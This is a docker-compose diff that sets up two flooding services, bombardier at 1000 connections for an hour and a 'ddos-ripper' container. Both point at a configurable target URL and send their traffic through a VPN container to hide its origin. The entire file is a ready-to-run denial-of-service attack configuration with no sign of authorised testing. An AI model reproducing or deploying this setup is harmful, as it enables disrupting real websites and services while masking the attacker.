@@ -8,7 +8,13 @@ services:
       - vpn
   bombardier:
     image: alpine/bombardier
-    command: "-c 1000 -d 3600s -l ${B_TARGET}"
+    command: "-c 1000 -d 3600s -l ${TARGET_URL}"
+    network_mode: "service:vpn"
+    depends_on: 
+      - vpn
+  ddosripper:
+    image: nitupkcuf/ddos-ripper:latest
+    command: "${TARGET_URL}"
     network_mode: "service:vpn"
     depends_on: 
       - vpn
